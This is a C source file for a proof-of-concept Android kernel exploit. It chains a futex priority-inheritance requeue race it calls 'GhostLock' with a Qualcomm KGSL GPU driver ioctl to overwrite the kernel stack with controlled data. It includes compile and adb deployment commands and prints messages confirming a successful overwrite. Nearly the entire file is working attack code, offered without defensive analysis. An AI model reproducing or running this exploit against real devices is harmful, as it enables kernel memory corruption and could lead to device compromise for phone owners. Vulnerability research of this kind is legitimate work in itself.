/**
 * kgsl_ghostlock_poc.c — Minimal GhostLock + KGSL stack overwrite PoC
 *
 * Verifies the full exploit chain: GhostLock trigger → kgsl ioctl overwrite.
 * If the kernel panics/oops, the stack overwrite is working.
 *
 * Compile (32-bit ARM):
 *   armv7a-linux-androideabi33-clang -static -O2 -pthread \
 *     kgsl_ghostlock_poc.c -o kgsl_ghostlock_poc
 *
 * Run:
 *   adb push kgsl_ghostlock_poc /data/local/tmp/
 *   adb shell /data/local/tmp/kgsl_ghostlock_poc
 *   # Check dmesg for panic/oops
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <time.h>
#include <signal.h>

/* ── KGSL ioctl ──────────────────────────────────────────────────── */
#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_IOCTL(nr, sz) \
    (((uint32_t)3 << 30) | (((uint32_t)(sz)) << 16) | (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))

#define IOCTL_KGSL_DRAWCTXT_CREATE  KGSL_IOCTL(0x13, 0x08)
#define IOCTL_KGSL_DRAWCTXT_DESTROY KGSL_IOCTL(0x14, 0x04)
#define IOCTL_KGSL_RB_ISSUEIBCMDS   KGSL_IOCTL(0x10, 0x20)

struct kgsl_ibdesc {
    uint64_t gpuaddr;
    uint64_t sizedwords;
};

struct kgsl_issueibcmds_compat {
    uint32_t drawctxt_id;
    uint32_t flags;
    uint32_t ibdesc_addr;
    uint32_t timestamp;
    uint32_t numibs;
};

/* ── GhostLock futex ─────────────────────────────────────────────── */
static uint32_t f_wait       __attribute__((aligned(4096)));
static uint32_t f_pi_target  __attribute__((aligned(4096)));
static uint32_t f_pi_chain   __attribute__((aligned(4096)));
static volatile int ghost_triggered;
static volatile int overwrite_done;

static inline long futex_op(uint32_t *uaddr, int op, uint32_t val,
                            const struct timespec *timeout,
                            uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* Waiter thread: triggers FUTEX_WAIT_REQUEUE_PI for GhostLock */
static void *waiter_thread(void *arg) {
    (void)arg;
    printf("[waiter] locking pi_chain...\n");
    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[waiter] pi_chain locked\n");

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 10;

    printf("[waiter] FUTEX_WAIT_REQUEUE_PI on f_wait...\n");
    long ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                        &timeout, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI returned: %ld (errno=%d)\n", ret, errno);

    /* ── KGSL stack overwrite ─────────────────────────────────── */
    printf("\n[kgsl] Starting KGSL stack overwrite...\n");

    int fd = open(KGSL_DEVICE, O_RDWR);
    if (fd < 0) {
        printf("[kgsl] ERROR: open %s failed (errno=%d)\n", KGSL_DEVICE, errno);
        return NULL;
    }
    printf("[kgsl] %s opened (fd=%d)\n", KGSL_DEVICE, fd);

    /* Create GPU context */
    struct { uint32_t flags; uint32_t drawctxt_id; } ctxt = {0, 0};
    int r = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctxt);
    printf("[kgsl] DRAWCTXT_CREATE: ret=%d id=%u (errno=%d)\n", r, ctxt.drawctxt_id, errno);

    if (r < 0) {
        printf("[kgsl] Context creation failed, trying without context...\n");
        ctxt.drawctxt_id = 1; /* try default context */
    }

    /* Build ibdesc with controlled data */
    /* TASK pointer (waiter+0x30): set to 0x4141414141414141 (test pattern) */
    struct kgsl_ibdesc ibdesc = {
        .gpuaddr    = 0x0000000000000000ULL,  /* pi_tree.left → NULL */
        .sizedwords = 0x4141414141414141ULL,  /* TASK → crash pattern */
    };

    /* Build issueibcmds struct */
    struct kgsl_issueibcmds_compat cmd = {
        .drawctxt_id = ctxt.drawctxt_id,
        .flags       = 0,
        .ibdesc_addr = (uint32_t)(uintptr_t)&ibdesc,
        .timestamp   = 0,
        .numibs      = 1,
    };

    printf("[kgsl] Firing RB_ISSUEIBCMDS:\n");
    printf("[kgsl]   ibdesc@%p gpuaddr=0x%016llx sizedwords=0x%016llx\n",
           (void*)&ibdesc,
           (unsigned long long)ibdesc.gpuaddr,
           (unsigned long long)ibdesc.sizedwords);
    printf("[kgsl]   cmd: ctx=%u ibdesc=0x%08x numibs=%u\n",
           cmd.drawctxt_id, cmd.ibdesc_addr, cmd.numibs);

    int ioctl_ret = ioctl(fd, IOCTL_KGSL_RB_ISSUEIBCMDS, &cmd);
    printf("[kgsl] RB_ISSUEIBCMDS: ret=%d (errno=%d)\n", ioctl_ret, errno);

    if (ioctl_ret < 0) {
        printf("[kgsl] ioctl failed with errno=%d — but CFU may have executed before validation!\n", errno);
    } else {
        printf("[kgsl] ioctl SUCCEEDED! Stack overwritten!\n");
    }

    overwrite_done = 1;
    close(fd);

    /* Clean up */
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

/* Owner thread: holds the pi_target */
static void *owner_thread(void *arg) {
    (void)arg;
    printf("[owner] locking pi_target...\n");
    futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_target locked\n");

    /* Wait for waiter to be ready */
    sleep(1);

    printf("[owner] locking pi_chain (creates PI chain)...\n");
    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_chain locked\n");

    /* Hold forever */
    while (!overwrite_done) sleep(1);
    return NULL;
}

int main(void) {
    printf("\n=== KGSL GhostLock Minimal PoC (32-bit ARM) ===\n\n");

    /* Ensure pages are faulted in */
    f_wait      = 0;
    f_pi_target = 0;
    f_pi_chain  = 0x12345678;

    printf("[*] Initial futex values:\n");
    printf("    f_wait      @ %p = 0x%08x\n", &f_wait, f_wait);
    printf("    f_pi_target @ %p = 0x%08x\n", &f_pi_target, f_pi_target);
    printf("    f_pi_chain  @ %p = 0x%08x\n", &f_pi_chain, f_pi_chain);

    pthread_t waiter, owner;
    pthread_create(&waiter, NULL, waiter_thread, NULL);
    usleep(100000);  /* Let waiter lock pi_chain and enter FUTEX_WAIT_REQUEUE_PI */
    pthread_create(&owner,  NULL, owner_thread,  NULL);

    /* Wait for owner to lock pi_target (creates PI dependency) */
    usleep(500000);

    /* Read actual futex word — kernel may have changed it */
    uint32_t fval = f_wait;
    printf("\n[trigger] f_wait=0x%08x — GhostLock CMP_REQUEUE_PI...\n", fval);

    /* Try multiple approaches to hit the race */
    for (int attempt = 0; attempt < 500; attempt++) {
        /* Try with actual value, and with val3=0 */
        long ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, fval,
                            (void *)(uintptr_t)1, &f_pi_target, 0);
        if (ret >= 0 && errno != EAGAIN && errno != EINVAL) {
            printf("[trigger] attempt %d: SUCCESS ret=%ld errno=%d\n", attempt, ret, errno);
            break;
        }
        /* Also try FUTEX_WAKE as alternative */
        if (attempt == 10) {
            ret = futex_op(&f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);
            printf("[trigger] WAKE attempt: ret=%ld errno=%d\n", ret, errno);
        }
        if (attempt == 0)
            printf("[trigger] attempt 0: ret=%ld errno=%d (fval=0x%x)\n", ret, errno, fval);
    }
    printf("[trigger] finished attempts, f_wait=0x%08x\n", f_wait);

    pthread_join(waiter, NULL);
    pthread_join(owner, NULL);

    printf("\n=== PoC Complete ===\n");
    printf("[*] Check kernel log for panic/oops:\n");
    printf("    adb shell dmesg | tail -50\n");
    printf("[*] If kernel crashed, kgsl stack overwrite WORKS!\n");

    return 0;
}
